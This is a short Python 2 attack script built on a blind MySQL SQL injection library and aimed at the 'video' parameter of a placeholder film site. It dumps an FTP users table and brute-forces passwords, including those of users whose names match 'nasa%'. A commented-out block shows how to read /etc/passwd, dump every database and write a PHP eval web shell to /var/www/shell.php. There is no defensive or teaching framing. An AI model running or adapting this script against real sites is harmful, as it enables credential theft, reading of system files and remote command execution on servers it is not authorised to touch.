#!/usr/bin/python2
import sys
sys.path.append("..")
from web.sqlInjection import *


b = BlindMySQL()
#b.form = 'formuB'
b.goodguy = 'success'
#b.debug = True
b.outfile = 'data'
b.post = 0 
b.param = 'video'
b.url = "http://www.xxxx.com/film.php?" 
#b.getDatabases()
#b.getTables('ftpusers')
#b.getColumns('ftpusers','users')
b.dumpTable('ftpusers','users')
#b.getData('ftpusers','users','gid')
b.getDataFiltered('ftpusers','user',"user like 'nasa%'",'password')


b.words.clear()
b.words.hexa()
#or:
#b.nums(1)
#b.words += ['a','b','c','d','e','f']
#words is a Wordlist object ;)

b.getData('ftpusers','users','password')




#b = BlindMySQL()
#b.form = 'formuB'
#b.badguy = '0 Resultados'
#b.goodguy = 'hay resultados'
#b.outfile = 'out'
#b.post = 1
#b.param = 'busca'
#b.url = 'http://www.oxxx.org/test'
#b.getDatabases()
#b.getTables('database')
#b.getColumns('database','table')
#b.getData('database','table','user')
#b.getDataFiltered('database','table','user','admin','password')
#b.existsFile('/etc/passwd')
#b.getDocumentRoot()
#b.getFile('/etc/passwd')
#b.writeFile('/var/www/shell.php','<?php eval($_GET["cmd"]); ?>');
#b.isRoot()
#b.dumpTable()
#b.dumpAllDB()

